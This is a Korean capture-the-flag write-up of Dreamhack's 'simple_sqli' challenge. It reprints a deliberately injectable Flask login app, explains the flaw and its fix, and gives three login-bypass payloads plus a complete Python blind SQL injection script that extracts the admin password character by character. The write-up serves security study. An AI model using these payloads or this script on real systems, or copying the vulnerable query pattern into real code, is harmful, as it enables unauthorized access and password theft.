# [Dreamhack Wargame] simple_sqli
### [🚩simple_sqli](https://dreamhack.io/wargame/challenges/24/)
  <img width="1072" alt="simple_sqli_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/c3e5faf9-a315-495b-a321-7a56e14f54ca">

<br/><br/>

## 문제 파일(app.py) 분석
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, g
import sqlite3
import os
import binascii

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read() # flag.txt 파일로부터 FLAG 데이터를 가져옴
except:
    FLAG = '[**FLAG**]'


# 데이터베이스
DATABASE = "database.db" # 데이터베이스 파일명을 database.db로 설정 (database.db 파일로 데이터베이스를 관리함)
if os.path.exists(DATABASE) == False: # 데이터베이스 파일이 존재하지 않는 경우
    # 데이터베이스 파일 생성 및 연결
    db = sqlite3.connect(DATABASE)
    
    # users 테이블 생성 (CREATE TABLE로 userid, userpassword를 열로 가지는 테이블을 생성함)
    db.execute('create table users(userid char(100), userpassword char(100));')
    # users 테이블에 관리자와 guest 계정을 생성 (INSERT INTO 사용)
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit() # 쿼리 실행 확정
    
    db.close() # DB 연결 종료



# 데이터베이스 관련 함수
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()



# 인덱스 페이지
@app.route('/')
def index():
    return render_template('index.html') # 인덱스 페이지(index.html)를 화면에 출력 (render_template 함수 사용)



# 로그인 페이지
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET': # GET 메소드의 요청을 전달할 경우
        return render_template('login.html') # 이용자아게 id와 pw를 요청받는 페이지(login.html)을 화면에 출력
    else: # POST 메소드의 요청을 전달한 경우
        # 이용자의 입력값인 userid, userpassword를 가져옴
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        
        # users 테이블에서 이용자가 입력한 userid와 userpassword가 일치하는 회원 정보를 불러오는 쿼리(SELECT문) 작성하여 데이터베이스에 전달
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        
        if res: # 쿼리 결과가 존재하는 경우
            userid = res[0] # 로그인할 계정을 해당 쿼리의 결과에서 불러와 사용함
            if userid == 'admin': # 결과로 받은 로그인 계정이 관리자 계정('admin')인 경우
                return f'hello {userid} flag is {FLAG}' # flag를 출력함
                
            return f'<script>alert("hello {userid}");history.go(-1);</script>' # 관리자 계정이 아닌 경우 "hello" 알림창만 출력함
            
        return '<script>alert("wrong");history.go(-1);</script>' # 쿼리 결과가 존재하지 않는 경우 "wrong" 알림창을 출력함


app.run(host='0.0.0.0', port=8000)
```

<br/><br/>


## 문제 풀이
### 취약점이 존재하는 코드
userid와 userpassword를 이용자에게 입력받고, 동적으로 쿼리문을 생성한 뒤 ```query_db``` 함수를 이용해 데이터베이스에 질의함
```python
res = query_db(f’select * from users where userid="{userid}" and userpassword=“{userpassword}”’)
```
* **Raw Query**: 동적으로 생성한 쿼리
	- Raw Query를 생성할 때 이용자의 입력값이 별다른 검사 과정 없이 쿼리문에 포함되면 SQL Injection 취약점에 노출될 수 있음
		+ 쿼리문을 직접 생성하는 방식이 아닌 **Prepared Statement**과 **Object Relational Mapping**(ORM)을 사용해 해결 가능
* 이용자의 입력값을 검사하는 과정이 없기 때문에 임의의 쿼리문을 userid 또는 userpassword에 삽입해 SQL Injection 공격을 수행할 수 있음


<br/><br/>

### 익스플로잇

#### SQL Injection: 관리자의 계정을 모른 채 로그인을 우회하여 풀이하는 방법
* 정상적인 이용자가 로그인을 위해 실행하는 쿼리문
	```SQL
	select * from users where userid=“{userid}” and userpassword=“{userpassword}”
	```
	- 위의 쿼리문을 참고해 admin이라는 결과가 반환되도록 쿼리문을 조작해야 함
		+ SQL은 수많은 조건절을 제공하기 때문에 다양한 방법으로 공격을 시도할 수 있음
* admin 계정으로 로그인할 수 있는 SQL Injection 공격 코드
   1. userid 검색 조건만을 처리하도록, 뒤의 내용은 주석 처리하는 방식
      - userid, userpassword 입력값
		    | userid | userpassword |
        |-----|-----|
        | admin"-- | DUMMY (아무 문자열이나 입력해도 상관 없음) |
        + 생성되는 쿼리문
          ```SQL
          select * from users where userid="admin"--" and userpassword="DUMMY"
          ```
	<img width="1146" alt="sqli_1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/e09d2011-6c60-4cce-9097-c99dabc535d5">

  2. userid 검색 조건 뒤에 ```OR``` 조건을 추가하여 뒤의 내용과 관계없이 admin이 반환되도록 하는 방식
      - userid, userpassword 입력값
		    | userid | userpassword |
        |-----|-----|
        | admin" or "1 | DUMMY (아무 문자열이나 입력해도 상관 없음) |
        + 생성되는 쿼리문
          ```SQL
          select * from users where userid="admin" or "1" and userpassword="DUMMY"
          ```

	<img width="1146" alt="sqli_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/aa28fe5e-cc5a-421b-9e53-299accf9b321">

  3. userid 검색 조건 뒤에 ```or 1```을 추가하여 테이블의 모든 내용을 반환하도록 하고, ```LIMIT``` 절을 이용해 admin 행만 반환하도록 하는 방식
      - userid, userpassword 입력값
		    | userid | userpassword |
        |-----|-----|
        | " or 1 LIMIT 1,1 -- | DUMMY (아무 문자열이나 입력해도 상관 없음) |
        + 생성되는 쿼리문
          ```SQL
          select * from users where userid="" or 1 LIMIT 1,1--" and userpassword="DUMMY"
          ```

	<img width="1146" alt="sqli_3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/93a4fa37-d32f-459f-8f20-491752892a62">

* SQL Injection 수행 결과
	<img width="1146" alt="sqli_result" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/e7b5e886-90c1-427e-94d0-103bc1cfda2e">

<br/>

#### Blind SQL Injection: 관리자 계정의 비밀번호를 알아내고 올바른 경로로 로그인 하는 방법
* 쿼리를 자동화하기 위해 로그인 요청의 폼 데이터 구조를 파악해야 함
	- 로그인할 때 전송하는 POST 데이터의 구조를 파악하기 위해서 guest 계정으로 로그인할 때 전송되는 요청의 Form Data를 크롬 개발자 도구의 Network 탭에서 확인함
		<img width="1296" alt="blindsqli_form data" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/e2099c48-3846-426c-ad04-607e78123bbc">
		+ 로그인할 때 입력한 userid 값은 ```userid```로, password는 ```userpassword```로 전송됨을 확인할 수 있음

* Blind SQL Injection 공격 자동화 스크립트(blind_sqli_exploit.py)
```python
#!/usr/bin/python3.9
import requests
import sys
from urllib.parse import urljoin

class Solver:
    """Solver for simple_SQLi challenge"""
    
    # initialization
    def __init__(self, port: str) -> None:
        self._chall_url = f"http://host3.dreamhack.games:{port}" # port는 blind_sqli_exploit.py 코드 실행 시 입력함 (접속정보 확인)
        self._login_url = urljoin(self._chall_url, "login")
        
    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> requests.Response:
        login_data = {
            "userid": userid,
            "userpassword": userpassword
        }
        resp = requests.post(self._login_url, data=login_data)
        return resp
    
    
    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f"\" or {query}-- ", "hi")
        return resp
    
    
    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low+high) // 2
            if low+1 >= high:
                break
            query = query_tmpl.format(val=mid)
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid
    
    
    # attack methods
    
    # 비밀번호의 길이 파악
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\") < {{val}})"
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len) # 이진 탐색 알고리즘을 활용하여 시간을 단축함
        return pw_len
    
    
    # 한 글자씩 비밀번호를 알아냄
    def _find_password(self, user: str, pw_len: int) -> str:
        pw = ''
        for idx in range(1, pw_len+1):
            query_tmpl = f"((SELECT SUBSTR(userpassword,{idx},1) WHERE userid=\"{user}\") < CHAR({{val}}))"
            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2f, 0x7e)) # 이진 탐색 알고리즘을 사용하여 시간을 단축하고 있음
            print(f"{idx}. {pw}")
        return pw
    
    
    def solve(self) -> None:
        # Find the length of admin password
        pw_len = solver._find_password_length("admin")
        print(f"Length of the admin password is: {pw_len}")
        # Find the admin password
        print("Finding password:")
        pw = solver._find_password("admin", pw_len)
        print(f"Password of the admin is: {pw}")
        
        
if __name__ == "__main__":
    port = sys.argv[1]
    solver = Solver(port)
    solver.solve()	
```


* Blind SQL Injection 수행 결과
	<img width="1500" alt="blindsqli_result" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/44994f43-e77d-413d-8ddf-663137265244">
	- 접속 정보
		<img width="1058" alt="blindsqli_접속정보" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/10aee6e9-fb33-4afb-95ce-a45e069a97eb">
